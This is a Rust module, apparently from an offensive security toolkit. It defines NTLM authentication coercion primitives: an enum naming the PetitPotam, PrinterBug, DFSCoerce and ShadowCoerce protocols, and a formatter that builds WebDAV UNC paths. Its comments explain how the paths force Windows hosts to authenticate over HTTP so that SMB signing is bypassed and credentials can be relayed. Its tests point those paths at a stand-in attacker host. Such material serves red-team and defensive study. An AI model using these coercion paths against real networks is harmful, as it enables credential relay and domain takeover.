//! WebDAV (@80) and MSRPC coercion primitives.
//!
//! Provides WebDAV path formatters and trigger specifications to bypass SMB signing
//! by coercing Windows hosts to authenticate over HTTP (WebDAV) to an attacker-controlled listener.

use std::fmt;

/// Supported MSRPC coercion protocols.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CoercionProtocol {
    /// MS-EFSR Encrypting File System (PetitPotam)
    MsEfsr,
    /// MS-RPRN Print System Remote Protocol (SpoolSample / PrinterBug)
    MsRprn,
    /// MS-DFSNM Distributed File System Namespace Management (DFSCoerce)
    MsDfsnm,
    /// MS-FSRVP File Server Remote VSS Protocol (ShadowCoerce)
    MsFsrvp,
}

impl fmt::Display for CoercionProtocol {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::MsEfsr => write!(f, "MS-EFSR (PetitPotam)"),
            Self::MsRprn => write!(f, "MS-RPRN (SpoolSample)"),
            Self::MsDfsnm => write!(f, "MS-DFSNM (DFSCoerce)"),
            Self::MsFsrvp => write!(f, "MS-FSRVP (ShadowCoerce)"),
        }
    }
}

/// WebDAV coercion path formatter.
///
/// When Windows receives an UNC path with `@<port>` or `@SSL@<port>`, the `WebClient` service
/// redirects authentication from SMB (port 445) to HTTP/HTTPS.
/// This completely bypasses SMB signing enforcement, permitting immediate NTLM relaying to LDAP/ADCS.
#[derive(Debug, Clone)]
pub struct WebDavCoercionConfig {
    pub listener_host: String,
    pub listener_port: u16,
    pub use_ssl: bool,
    pub share_name: String,
    pub file_name: String,
}

impl Default for WebDavCoercionConfig {
    fn default() -> Self {
        Self {
            listener_host: "127.0.0.1".to_string(),
            listener_port: 80,
            use_ssl: false,
            share_name: "test".to_string(),
            file_name: "settings.ini".to_string(),
        }
    }
}

impl WebDavCoercionConfig {
    /// Create a new WebDAV coercion configuration.
    pub fn new(listener_host: impl Into<String>, listener_port: u16, use_ssl: bool) -> Self {
        Self {
            listener_host: listener_host.into(),
            listener_port,
            use_ssl,
            share_name: "share".to_string(),
            file_name: "test.txt".to_string(),
        }
    }

    /// Formats the WebDAV UNC path.
    ///
    /// - Standard HTTP: `\\listener@80\share\test.txt`
    /// - Custom port:   `\\listener@8080\share\test.txt`
    /// - SSL/HTTPS:     `\\listener@SSL@443\share\test.txt`
    pub fn format_unc_path(&self) -> String {
        if self.use_ssl {
            format!(
                r#"\\{}@SSL@{}\{}\{}"#,
                self.listener_host, self.listener_port, self.share_name, self.file_name
            )
        } else {
            format!(
                r#"\\{}@{}\{}\{}"#,
                self.listener_host, self.listener_port, self.share_name, self.file_name
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_webdav_path_http() {
        let cfg = WebDavCoercionConfig::new("attacker.corp", 80, false);
        assert_eq!(cfg.format_unc_path(), r#"\\attacker.corp@80\share\test.txt"#);
    }

    #[test]
    fn test_webdav_path_https() {
        let cfg = WebDavCoercionConfig::new("attacker.corp", 443, true);
        assert_eq!(cfg.format_unc_path(), r#"\\attacker.corp@SSL@443\share\test.txt"#);
    }

    #[test]
    fn test_webdav_path_custom_port() {
        let mut cfg = WebDavCoercionConfig::new("10.0.0.5", 8080, false);
        cfg.share_name = "dav".to_string();
        cfg.file_name = "dummy".to_string();
        assert_eq!(cfg.format_unc_path(), r#"\\10.0.0.5@8080\dav\dummy"#);
    }
}
